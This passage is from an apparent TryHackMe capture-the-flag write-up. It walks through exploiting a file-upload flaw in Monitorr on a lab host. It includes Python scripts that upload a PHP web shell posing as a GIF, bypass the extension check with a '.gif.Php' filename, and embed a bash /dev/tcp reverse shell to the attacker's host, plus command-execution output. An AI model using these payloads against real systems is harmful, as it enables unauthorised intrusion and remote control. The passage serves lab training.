    &lt;span class=&quot;s&quot;&gt;'Cache-Control'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'max-age=0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://monitorr.robyns-petshop.thm/assets/php/upload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Not only does this format the request nicely, but it makes it easy for us to use this in our script. As we can see, when our browser sent a request, it sent it along with the cookie &lt;code class=&quot;highlighter-rouge&quot;&gt;isHuman:1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Of course it isn‚Äôt &lt;em&gt;super&lt;/em&gt; helpful here, because the request payload is small and all we need to add is a cookie. But I find that it‚Äôs good to know for when you need longer curl requests formatted.&lt;/p&gt;

&lt;p&gt;Here is the modified script so far:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib3.exceptions&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;category&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;specify params in format: python &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; target_url lhost lport&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/assets/php/upload.php&quot;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;isHuman&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain, */*; q=0.01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;X-Requested-With&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;XMLHttpRequest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;'-----------------------------31046105003900160576454225745&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;she_ll.php&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Type: image/gif&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GIF89a213213123&amp;lt;?php shell_exec(&quot;/bin/bash -c &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/'&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; 0&amp;gt;&amp;amp;1'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-----------------------------31046105003900160576454225745--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A shell script should be uploaded. Now we try to execute it&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/assets/data/usrimg/she_ll.php&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure-Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I use the &lt;a href=&quot;https://pypi.org/project/black/&quot;&gt;Black&lt;/a&gt; formatter to neaten up my python code. There are easy to install extensions/plugins for it for all the popular text editors. I like using vim for small things, so it‚Äôs handy to bind black to a shortcut that lets you quickly make your code nicer to read :)&lt;/p&gt;

&lt;p&gt;Anyway, here‚Äôs what happens when you run this code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:/tmp/thm]
‚îî‚îÄ‚ïº &amp;gt;  python3 code.py https://monitorr.robyns-petshop.thm/ lhost lport
&amp;lt;div id='uploadreturn'&amp;gt;&amp;lt;div id='uploaderror'&amp;gt;ERROR: she_ll.php is not an image or exceeds the webserver‚Äôs upload size limit.&amp;lt;/div&amp;gt;&amp;lt;div id='uploaderror'&amp;gt;ERROR: she_ll.php was not uploaded.&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay so now we have a different error. We are able to make requests, but it appears to be detecting the filetype somehow.&lt;/p&gt;

&lt;p&gt;I tried a few things, I tried uploading with the header of a jpg instead of a gif, changing the filesize (there is by default an image of size 5.3kb so this shoud not have been a problem), the file extension (I tried .php3, .php4, .php5, .phtml, .inc,  and .gif.{extension} for all of the extensions listed). None of these seemed to work, so I just looked at some php file upload cheat sheets, and tried everything I could find.&lt;/p&gt;

&lt;p&gt;After some research, I found that I could upload any file extension. This was possible by uploading a file in the format &lt;code class=&quot;highlighter-rouge&quot;&gt;filename.gif.pht&lt;/code&gt; for example. For some reason, common filetypes that would normally work such as .pht did not in this case.&lt;/p&gt;

&lt;p&gt;I found that I could upload specifically php files by altering the case, as on upload, the filename would become all lower case.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/file-upload&quot;&gt;this cheatsheet&lt;/a&gt; was particularly helpful&lt;/p&gt;

&lt;h1 id=&quot;getting-code-execution-as-user&quot;&gt;Getting code execution as user&lt;/h1&gt;

&lt;p&gt;Adding this to the code should allow us to get code execution. Let‚Äôs try it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:/tmp/thm]
‚îî‚îÄ‚ïº &amp;gt;  python3 script.py &quot;ls -lah; whoami&quot;
total 16K
drwxr-xr-x 2 www-data www-data 4.0K May  9 01:48 .
drwxr-xr-x 5 www-data www-data 4.0K Apr 11 00:11 ..
-rw-r--r-- 1 www-data www-data   73 May  9 01:48 46glaw.gif.php
-rw-r--r-- 1 www-data www-data   78 May  9 01:48 qnugua.gif.php
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice! So if we want the first flag, we simply look in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; like so:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:/tmp/thm]
‚îî‚îÄ‚ïº &amp;gt;  python3 script.py &quot;ls -a /var/www&quot;
.
..
dev
flag1.txt
html
monitorr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; is the home directory of the www-data user. However if you aren‚Äôt sure of where a user‚Äôs home directory is then you can simply look in the /etc/passwd file :)&lt;/p&gt;

&lt;p&gt;Epic, one flag down!&lt;/p&gt;

&lt;p&gt;Also, here is the code for the script used above:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib3.exceptions&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;category&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urandom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.gif.Php&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# just gets a random filename so we don't have to worry abt repeats
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;specify params in format: python &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://monitorr.robyns-petshop.thm//assets/php/upload.php&quot;&lt;/span&gt;

